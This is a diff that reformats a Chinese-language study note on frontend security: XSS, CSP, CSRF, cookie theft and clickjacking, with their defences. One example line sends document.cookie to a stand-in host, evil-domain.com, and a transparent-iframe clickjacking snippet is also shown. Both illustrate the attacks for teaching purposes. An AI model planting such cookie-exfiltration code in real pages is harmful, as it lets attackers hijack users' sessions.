@@ -34,7 +34,7 @@ CSP 的功能：
 - 禁止执行内联脚本和未授权的脚本；
 - 还提供了上报机制，这样可以帮助我们尽快发现有哪些 XSS 攻击，以便尽快修复问题。
 
-React中：
+React 中：
 
 React DOM 在渲染所有输入内容之前，默认会进行转义。它可以确保在你的应用中，永远不会注入那些并非自己明确编写的内容。所有的内容在渲染之前都被转换成了字符串。这样可以有效地防止 XSS（cross-site-scripting, 跨站脚本）攻击。
 
@@ -42,7 +42,7 @@ React DOM 在渲染所有输入内容之前，默认会进行转义。它可以�
 
 ### 什么是 CSRF
 
-CSRF是跨站请求伪造意思。原理是攻击者构造出一个后端请求地址，诱导用户去点击发起请求。如果是登陆状态，服务端就会以为是用户在操作，从而进行相应的逻辑，不如冒用用户转账，转发邮件，发帖等等。  CSRF 的要点就在于，它不是为了窃取用户的登录凭证（cookie 等），而是直接利用用户已经登录过网站而留存在浏览器上的凭证，诱使用户访问恶意链接，借助登录凭证去执行敏感操作，整个攻击过程是在用户的浏览器上完成的。
+CSRF 是跨站请求伪造意思。原理是攻击者构造出一个后端请求地址，诱导用户去点击发起请求。如果是登陆状态，服务端就会以为是用户在操作，从而进行相应的逻辑，不如冒用用户转账，转发邮件，发帖等等。 CSRF 的要点就在于，它不是为了窃取用户的登录凭证（cookie 等），而是直接利用用户已经登录过网站而留存在浏览器上的凭证，诱使用户访问恶意链接，借助登录凭证去执行敏感操作，整个攻击过程是在用户的浏览器上完成的。
 
 案例：Q 币、QQ 音乐向腾讯微博分享歌单、csrf 蠕虫。
 
@@ -67,7 +67,7 @@ CSRF是跨站请求伪造意思。原理是攻击者构造出一个后端请求�
 - 不让第三方网站访问到用户的 cookie，设置 cookie 的 SameSite 属性为 strict 或 lax，不让 cookie 随跨域请求携带（就 cookie 不让第三方网站使用）；
 - 阻止第三方网站请求接口，验证 Referer 和 Origin；
 - Token 验证，登陆后服务器下发一个随机 token，之后的请求带上。
-- 图形验证码，比较好，但会降低用户体验。（如ccap）
+- 图形验证码，比较好，但会降低用户体验。（如 ccap）
 
 > SameSite 目前只有 Chrome 支持
 
@@ -113,8 +113,7 @@ POST 请求含有 token，可以是以下几种方式之一，koa-csrf 插件就
 cookie 容易被盗；
 
 ```js
-new Image().src =
-  'http://www.evil-domain.com/steal-cookie.php?cookie=' + document.cookie;
+new Image().src = 'http://www.evil-domain.com/steal-cookie.php?cookie=' + document.cookie;
 ```
 
 防止：HttpOnly 设置为 true，但这个属性兼容性不太好。
@@ -129,13 +128,7 @@ new Image().src =
 
 ```html
 <body style="background:url(clickhijack.png) no-repeat">
-  <iframe
-    style="opacity:.1"
-    src="http://localhost:1521/post/1"
-    width="800"
-    height="600"
-  >
-  </iframe>
+  <iframe style="opacity:.1" src="http://localhost:1521/post/1" width="800" height="600"> </iframe>
 </body>
 ```
 
@@ -158,11 +151,9 @@ new Image().src =
 
 3. 远古浏览器使用 js 防御，当通过 iframe 的方式加载页面时，让攻击者网站不显示内容。
 
-
 ## 一些前端安全的资料
 
 - [Where to Store your JWTs – Cookies vs HTML5 Web Storage](https://stormpath.com/blog/where-to-store-your-jwts-cookies-vs-html5-web-storage)
-
 
 ## 传输安全
 
@@ -277,7 +268,4 @@ Hash 函数是这样，不论原始数据有多长、有多少位，经过 Hash 
 
 是系统设计层面的。
 
-将渲染进程和操作系统隔离的这道墙就是我们要聊的安全沙箱。
-安全沙箱是不能防止 XSS 或者 CSRF 一类的攻击
-安全沙箱的目的是隔离渲染进程和操作系统，让渲染进行没有访问操作系统的权利
-XSS 或者 CSRF 主要是利用网络资源获取用户的信息，这和操作系统没有关系的
+将渲染进程和操作系统隔离的这道墙就是我们要聊的安全沙箱。安全沙箱是不能防止 XSS 或者 CSRF 一类的攻击安全沙箱的目的是隔离渲染进程和操作系统，让渲染进行没有访问操作系统的权利 XSS 或者 CSRF 主要是利用网络资源获取用户的信息，这和操作系统没有关系的
